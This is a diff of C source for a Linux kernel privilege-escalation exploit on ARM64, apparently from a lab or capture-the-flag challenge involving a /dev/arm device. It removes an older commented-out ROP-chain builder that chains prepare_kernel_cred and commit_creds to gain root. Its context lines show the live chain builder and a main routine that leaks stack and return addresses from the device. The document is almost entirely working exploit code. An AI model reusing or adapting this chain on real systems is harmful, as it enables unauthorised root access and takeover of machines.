@@ -51,78 +51,6 @@ void spawn_shell(){
     }
 }
 
-// returns stack lift address
-/*void* create_rop_chain2(unsigned long pstate, unsigned long saved_sp, unsigned long return_address){
-	unsigned long dummy = 0xdeadbeefdeadbeef;
-
-	printf("[+] Creating ROP chain on allocated page...\n");
-	unsigned long* mem = (unsigned long*)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
-	if(mem < 0){
-		printf("[-] Error during mmap\n");
-		perror("mmap");
-		exit(-1);
-	}
-
-	mem[0] = 0xdeadbeefdeadbeef;
-	unsigned int off = 464;
-
-	//--------------POP X0, POP X19
-	mem[off++] = dummy;
-	mem[off++] = blr_x19_pop_x19; // x30
-	mem[off++] = prepare_kernel_cred; // x19
-	mem[off++] = dummy;
-	mem[off++] = dummy;
-	mem[off++] = 0x0; // x0
-	//--------------BLR X19, POP X19
-	mem[off++] = dummy;
-	mem[off++] = blr_x19_pop_x19; // x30
-	mem[off++] = commit_creds; // x19
-	mem[off++] = dummy; // x20
-	//--------------BLR X19, POP X19
-	mem[off++] = dummy;
-	mem[off++] = kernel_exit; // x30
-	mem[off++] = dummy; // x19
-	mem[off++] = dummy; // x20
-	//--------------RET FROM SYSCALL
-	mem[off++] = 0x0; // x0
-	mem[off++] = 0x0; // x1
-	mem[off++] = 0x0; // x2 
-	mem[off++] = 0x0; // x3
-	mem[off++] = 0x0; // x4
-	mem[off++] = 0x0; // x5
-	mem[off++] = 0x0; // x6
-	mem[off++] = 0x0; // x7
-	mem[off++] = 0x0; // x8
-	mem[off++] = 0x0; // x9
-	mem[off++] = 0x0; // x10
-	mem[off++] = 0x0; // x11
-	mem[off++] = 0x0; // x12
-	mem[off++] = 0x0; // x13
-	mem[off++] = 0x0; // x14
-	mem[off++] = 0x0; // x15
-	mem[off++] = 0x0; // x16
-	mem[off++] = 0x0; // x17
-	mem[off++] = 0x0; // x18
-	mem[off++] = 0x0; // x19
-	mem[off++] = 0x0; // x20
-	mem[off++] = 0x0; // x21
-	mem[off++] = 0x0; // x22
-	mem[off++] = 0x0; // x23
-	mem[off++] = 0x0; // x24
-	mem[off++] = 0x0; // x25
-	mem[off++] = 0x0; // x26
-	mem[off++] = 0x0; // x27
-	mem[off++] = 0x0; // x28
-	mem[off++] = 0x0; // x29
-	mem[off++] = 0x0; // x30 (sp + 0xf0)
-	mem[off++] = saved_sp; // -> sp_el0 
-	mem[off++] = return_address; // -> elr_el1
-	mem[off++] = pstate; // -> spsr_el1
-	//TODO: save PSTATE
-
-	return (void*)(((unsigned long)mem) + 0xe80);
-}*/
-
 void create_rop_chain2(unsigned long* mem, unsigned long pstate, unsigned long saved_sp, unsigned long return_address){
 	unsigned int off = 0;
 	unsigned long dummy = 0xdeadbeefdeadbeef;
@@ -229,8 +157,6 @@ int main(){
     read_write_stack messenger;
     messenger.buf = buf;
     unsigned long stack_addr;
-    struct bpf_insn* insn;
-    const char payload[] = "Hellooo\0";
 
 	printf("[+] Opening device file...\n");
 	fd = open("/dev/arm", O_RDWR);
@@ -249,8 +175,7 @@ int main(){
 	}
 
 	printf("[+] x30 of outer function: 0x%lx\n", buf[66]);
-
-	// wong, 
+ 
 	stack_addr = buf[67] - 0x2a8;
 	printf("[+] Stack address: 0x%lx\n", stack_addr);
 
